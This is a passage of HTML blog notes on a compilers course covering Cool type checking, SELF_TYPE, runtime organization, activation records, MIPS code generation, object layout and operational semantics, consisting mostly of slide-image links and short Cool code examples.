src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724145112483.png" class="" title="image-20200724145112483"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724145555997.png" class="" title="image-20200724145555997"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724145757350.png" class="" title="image-20200724145757350"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724150056109.png" class="" title="image-20200724150056109"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724150109672.png" class="" title="image-20200724150109672"><h3 id="Implementing-Type-Checking"><a href="#Implementing-Type-Checking" class="headerlink" title="Implementing Type Checking"></a>Implementing Type Checking</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724151522565.png" class="" title="image-20200724151522565"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724151938870.png" class="" title="image-20200724151938870"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724152341217.png" class="" title="image-20200724152341217"><h3 id="PA4"><a href="#PA4" class="headerlink" title="PA4"></a>PA4</h3><h2 id="Cool-Type-Checking-amp-Runtime-Organization"><a href="#Cool-Type-Checking-amp-Runtime-Organization" class="headerlink" title="Cool Type Checking &amp; Runtime Organization"></a>Cool Type Checking &amp; Runtime Organization</h2><h3 id="Static-vs-Dynamic-Typing"><a href="#Static-vs-Dynamic-Typing" class="headerlink" title="Static vs. Dynamic Typing"></a>Static vs. Dynamic Typing</h3><p>Static type systems detect common errors( at compile time)</p><p><strong>But some correct programs are disallowed</strong></p><ul><li>Some argue for dynamic type checking instead</li><li>Others want more expressive static type checking</li></ul><p>Soundness theorem: for all expressions <strong>E</strong> </p><p><strong>dynamic_type(E)=static_type(E)</strong></p><p><em>In all executions,E evaluates to values of the type inferred by the compiler.</em></p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200803110654648.png" class="" title="image-20200803110654648"><h3 id="Self-Type"><a href="#Self-Type" class="headerlink" title="Self Type"></a>Self Type</h3><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-keyword">class</span> <span class="hljs-built_in">Count</span>&#123;<br>i:<span class="hljs-built_in">int</span>-<span class="hljs-number">0</span>; <br>inc():<span class="hljs-built_in">Count</span>&#123;//返回<span class="hljs-built_in">Count</span>的<span class="hljs-keyword">class</span>类型<br>&#123;<br>i&lt;-i+<span class="hljs-number">1</span>; <br>self;<br>&#125;<br>&#125;;<br>&#125;;<br><br><span class="hljs-keyword">class</span> Stock inherits <span class="hljs-built_in">Count</span>&#123;<br><span class="hljs-keyword">name</span>: String;--<span class="hljs-keyword">name</span> of item<br>&#125;<br><span class="hljs-keyword">class</span> Main&#123;<br>Stocka-(new Stock).inc();//类型错误，<span class="hljs-built_in">Count</span>不是Stock的子集<br>...a.<span class="hljs-keyword">name</span> ...<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200803112048486.png" class="" title="image-20200803112048486"><h3 id="Self-Type-Operations"><a href="#Self-Type-Operations" class="headerlink" title="Self Type Operations"></a>Self Type Operations</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200803112942180.png" class="" title="image-20200803112942180"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200803113101122.png" class="" title="image-20200803113101122"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200803113408665.png" class="" title="image-20200803113408665"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200803114939592.png" class="" title="image-20200803114939592"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200803115337069.png" class="" title="image-20200803115337069"><h3 id="Self-Type-Usage"><a href="#Self-Type-Usage" class="headerlink" title="Self Type Usage"></a>Self Type Usage</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804090907495.png" class="" title="image-20200804090907495"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804090921258.png" class="" title="image-20200804090921258"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804091404056.png" class="" title="image-20200804091404056"><h3 id="Self-Type-Checking"><a href="#Self-Type-Checking" class="headerlink" title="Self Type Checking"></a>Self Type Checking</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804094143731.png" class="" title="image-20200804094143731"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804094222838.png" class="" title="image-20200804094222838"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804094434305.png" class="" title="image-20200804094434305"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804094508391.png" class="" title="image-20200804094508391"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804094930978.png" class="" title="image-20200804094930978"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804094952794.png" class="" title="image-20200804094952794"><h3 id="Error-Recovery"><a href="#Error-Recovery" class="headerlink" title="Error Recovery"></a>Error Recovery</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804100054994.png" class="" title="image-20200804100054994"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804095353003.png" class="" title="image-20200804095353003"><blockquote><p>a workable solution but with cascading errors</p></blockquote><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804100442013.png" class="" title="image-20200804100442013"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804100525228.png" class="" title="image-20200804100525228"><h3 id="Runtime-Organization"><a href="#Runtime-Organization" class="headerlink" title="Runtime Organization"></a>Runtime Organization</h3><p> Enforcing the language definition is just one purpose of the front-end. The front-end also builds the data structures that are needed to do co-generation as we seen but there is a real. Once we get through the front-end we no longer looking for errors in the program. We’re no longer trying to figure out whether it’s a valid program. Now we’re really down to the point where we’re going to generate code And that is a job at the back end. </p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804100935737.png" class="" title="image-20200804100935737"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804101607087.png" class="" title="image-20200804101607087"><h3 id="Activations"><a href="#Activations" class="headerlink" title="Activations"></a>Activations</h3><p>Two goals:</p><ul><li>Correctness</li><li>Speed</li></ul><p>Complications in code generation come from trying to be fast as well as correct</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804102036374.png" class="" title="image-20200804102036374"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804103800174.png" class="" title="image-20200804103800174"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804103904151.png" class="" title="image-20200804103904151"><h4 id="activation-tree"><a href="#activation-tree" class="headerlink" title="activation tree"></a>activation tree</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804104501937.png" class="" title="image-20200804104501937"><blockquote><p>子树在同一行内代表调用后，需要依次调用的函数</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">is<span class="hljs-constructor">Even(<span class="hljs-params">x</span>:Int)</span> : Bool &#123;x % <span class="hljs-number">2</span><span class="hljs-operator"> == </span><span class="hljs-number">0</span>&#125;;<br>is<span class="hljs-constructor">One(<span class="hljs-params">x</span>:Int)</span> : Bool &#123;x<span class="hljs-operator"> == </span><span class="hljs-number">1</span>&#125;;<br>power<span class="hljs-constructor">OfTwo(<span class="hljs-params">x</span>:Int)</span> : Bool &#123;<br><span class="hljs-keyword">if</span> is<span class="hljs-constructor">Even(<span class="hljs-params">x</span>)</span> <span class="hljs-keyword">then</span> power<span class="hljs-constructor">OfTwo(<span class="hljs-params">x</span> <span class="hljs-operator">/</span> 2)</span><br><span class="hljs-keyword">else</span> is<span class="hljs-constructor">One(<span class="hljs-params">x</span>)</span><br>&#125;;<br></code></pre></td></tr></table></figure><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804105015043.png" class="" title="image-20200804105015043"></blockquote><h3 id="Activation-Records"><a href="#Activation-Records" class="headerlink" title="Activation Records"></a>Activation Records</h3><p>The information needed to manage one procedure activation is called an activation record (AR) or frame</p><p>If procedure <strong>F</strong> calls <strong>G</strong>, then <strong>G</strong>‘s activation record contains a mix of info about <strong>F</strong> and <strong>G</strong>.</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804105747132.png" class="" title="image-20200804105747132"><p>The compiler must determine,at compile-time,the layout of activation records and generate code that correctly accesses locations in the activation record </p><p>Thus,the AR layout and the code generator must be designed together!</p><h3 id="Globals-and-Heap"><a href="#Globals-and-Heap" class="headerlink" title="Globals and Heap"></a>Globals and Heap</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804111927233.png" class="" title="image-20200804111927233"><p>Both the heap and the stack grow</p><p>Must take care that they don’t grow into each other</p><p>Solution:start heap and stack at opposite ends of memory and let them grow towards each other</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804112106101.png" class="" title="image-20200804112106101"><h3 id="Alignment"><a href="#Alignment" class="headerlink" title="Alignment"></a>Alignment</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804112719766.png" class="" title="image-20200804112719766"><h3 id="Stack-Machines"><a href="#Stack-Machines" class="headerlink" title="Stack Machines"></a>Stack Machines</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804112851657.png" class="" title="image-20200804112851657"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804113208145.png" class="" title="image-20200804113208145"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804113359758.png" class="" title="image-20200804113359758"> <img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804114035608.png" class="" title="image-20200804114035608"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804114216478.png" class="" title="image-20200804114216478"><p>After evaluating an expression e, the accumulator holds the value of e and the stack is unchanged.</p><p> <em>Expression evaluation preserves the stack.</em></p><h4 id="exmaple"><a href="#exmaple" class="headerlink" title="exmaple"></a>exmaple</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804115009773.png" class="" title="image-20200804115009773"><h2 id="Code-Generation"><a href="#Code-Generation" class="headerlink" title="Code Generation"></a>Code Generation</h2><h3 id="Introduction-to-Code-Generation"><a href="#Introduction-to-Code-Generation" class="headerlink" title="Introduction to Code Generation"></a>Introduction to Code Generation</h3><p>The accumulator is kept in MIPS register $a0</p><p>The stack is kept in memory</p><ul><li>The stack grows towards lower addresses</li><li>Standard convention on MIPS</li></ul><p>The address of the next location on the stack is kept in MIPS register <code>$sp</code> (stack pointer</p><ul><li>The top of the stack is at address <code>$sp+4</code></li></ul><p><strong>Stack is growing towards low addresses</strong></p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808090532307.png" class="" title="image-20200808090532307"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808090733566.png" class="" title="image-20200808090733566"><h4 id="example"><a href="#example" class="headerlink" title="example"></a>example</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808090948399.png" class="" title="image-20200808090948399"><h3 id="Code-Generation-I"><a href="#Code-Generation-I" class="headerlink" title="Code Generation I"></a>Code Generation I</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808092449719.png" class="" title="image-20200808092449719"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808092520377.png" class="" title="image-20200808092520377"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808092406241.png" class="" title="image-20200808092406241"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808092138761.png" class="" title="image-20200808092138761"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808092837102.png" class="" title="image-20200808092837102"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808093434286.png" class="" title="image-20200808093434286"><h3 id="Code-Generation-II"><a href="#Code-Generation-II" class="headerlink" title="Code Generation II"></a>Code Generation II</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808101554898.png" class="" title="image-20200808101554898"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808101652847.png" class="" title="image-20200808101652847"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808101826630.png" class="" title="image-20200808101826630"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808102115320.png" class="" title="image-20200808102115320"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808102420307.png" class="" title="image-20200808102420307"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808102625336.png" class="" title="image-20200808102625336"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808102731121.png" class="" title="image-20200808102731121"><h4 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808103106476.png" class="" title="image-20200808103106476"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808103516812.png" class="" title="image-20200808103516812"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808103618842.png" class="" title="image-20200808103618842"><h3 id="Code-Generation-Example"><a href="#Code-Generation-Example" class="headerlink" title="Code Generation Example"></a>Code Generation Example</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808104801419.png" class="" title="image-20200808104801419"><h3 id="Temporaries"><a href="#Temporaries" class="headerlink" title="Temporaries"></a>Temporaries</h3><p>Idea:Keep temporaries in the AR</p><p>The code generator must assign a fixed location in the AR for each temporary</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808113002505.png" class="" title="image-20200808113002505"><blockquote><p>While we need one here for the predicate, but notice that once the predicate is decided, once we know the answer to whether this predicate is true or false, we don’t need that temporary anymore. So in fact, that temporary can be reclaimed; we don’t need the space for that temporary anymore by the time we get to the false branch.</p></blockquote><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808112920088.png" class="" title="image-20200808112920088"><blockquote><p>NT(e1 + e2) = max(NT(e1), 1 + NT(e2))</p></blockquote><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808113708280.png" class="" title="image-20200808113708280"><h4 id="example-2"><a href="#example-2" class="headerlink" title="example"></a>example</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808113903169.png" class="" title="image-20200808113903169"><blockquote><p>最多需要两个temporaries来储存这些数据</p><p>if 的true 或flase 一个，单个int可以变成返回值（不用临时变量），调用fib 传递的参数需要用临时变量</p></blockquote><p>For a function definition <strong>f(x.…… Xn)=e</strong> the AR has <strong>2+n+NT(e)</strong> elements</p><ul><li>Return addressL</li><li>Frame pointer C</li><li><strong>n</strong> arguments</li><li><strong>NT(e)</strong> locations for intermediate results</li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808114653932.png" class="" title="image-20200808114653932"><h4 id="new-scheme"><a href="#new-scheme" class="headerlink" title="new scheme"></a>new scheme</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808115316923.png" class="" title="image-20200808115316923"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808115353156.png" class="" title="image-20200808115353156"><blockquote><p>nt  unused temporary</p></blockquote><h3 id="Object-Layout"><a href="#Object-Layout" class="headerlink" title="Object Layout"></a>Object Layout</h3><p>00 implementation=Basic code generation + <strong>More stuff</strong></p><p>0o Slogan:If <strong>B is a subclass of A</strong>,than an object of class B can be used wherever an object of class A is expected</p><p>This means that code in class A works <strong>unmodified</strong> for an object of class B</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808120906584.png" class="" title="image-20200808120906584"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808121002133.png" class="" title="image-20200808121002133"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808121205970.png" class="" title="image-20200808121205970"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808120828905.png" class="" title="image-20200808120828905"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808120723112.png" class="" title="image-20200808120723112"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808121617559.png" class="" title="image-20200808121617559"><p>Every class has a fixed set of methods</p><ul><li>including inherited methods</li></ul><p>A <strong>dispatch table</strong> indexes these methods</p><ul><li>An array of method entry points</li><li>A method <strong>f</strong> lives at <strong>a fixed offset</strong> in the dispatch table for a class and <strong>all of its subclasses</strong></li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808122344016.png" class="" title="image-20200808122344016"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808122753473.png" class="" title="image-20200808122753473"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808122815394.png" class="" title="image-20200808122815394"><h3 id="opentional-Semantics-overview"><a href="#opentional-Semantics-overview" class="headerlink" title="opentional Semantics overview"></a>opentional Semantics overview</h3><p>We must specify for every Cool expression what happens<br>when it is evaluated</p><ul><li>This is the”meaning”of an expression</li></ul><p>The definition of a programming language:</p><ul><li>The tokens &gt;lexical analysis</li><li>The grammar &gt;syntactic analysis</li><li>The typing rules &gt;semantic analysis</li><li>The evaluation rules<br>  →code generation and optimization</li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808142452501.png" class="" title="image-20200808142452501"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808142730543.png" class="" title="image-20200808142730543"><h4 id="Denotaional-semantics"><a href="#Denotaional-semantics" class="headerlink" title="Denotaional semantics"></a>Denotaional semantics</h4><p>Program’s meaning is a mathematical function</p><h4 id="Axiomatic-semantics"><a href="#Axiomatic-semantics" class="headerlink" title="Axiomatic semantics"></a>Axiomatic semantics</h4><ul><li>Program behavior described via logical formulae<ul><li>If execution begins in state satisfying X,then it ends in state satisfyingY</li><li>X,Y formulas</li></ul></li><li>Foundation of many program verification systems</li></ul><h3 id="Operational-Semantics"><a href="#Operational-Semantics" class="headerlink" title="Operational Semantics"></a>Operational Semantics</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808143144331.png" class="" title="image-20200808143144331"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808143427301.png" class="" title="image-20200808143427301"><p>A variable environment maps variables to locations</p><ul><li><p>Keeps track of which yariables are in scope</p></li><li><p>Tells us where those variables are</p><p><strong>E = [ a : l1, b : l2 ]</strong></p></li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808144113316.png" class="" title="image-20200808144113316"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808144211557.png" class="" title="image-20200808144211557"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808144502293.png" class="" title="image-20200808144502293"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808144825648.png" class="" title="image-20200808144825648"><h3 id="Cool-Semantics"><a href="#Cool-Semantics" class="headerlink" title="Cool Semantics"></a>Cool Semantics</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808145028046.png" class="" title="image-20200808145028046"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808145137544.png" class="" title="image-20200808145137544"><blockquote><p>first we look up in the environment <strong>E</strong> where that identifier <strong>id</strong> is stored so now we give us back a memory </p><p>location <strong>l</strong>. So by in this case And then we look up in the store <strong>S</strong> what the value is at that memory locations, So, </p><p>we use the same memory location here as an argument to the store to get back the value that variable currently</p><p>has And notice I just have a reference, this is a read of memories so this is loading, I think it was loading the </p><p>value of the variable. This does not affect the store so the store <strong>S</strong> is the same before and after. This is just looking </p><p>at the value</p></blockquote><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808145557313.png" class="" title="image-20200808145557313"><h4 id="assignment"><a href="#assignment" class="headerlink" title="assignment"></a>assignment</h4><img 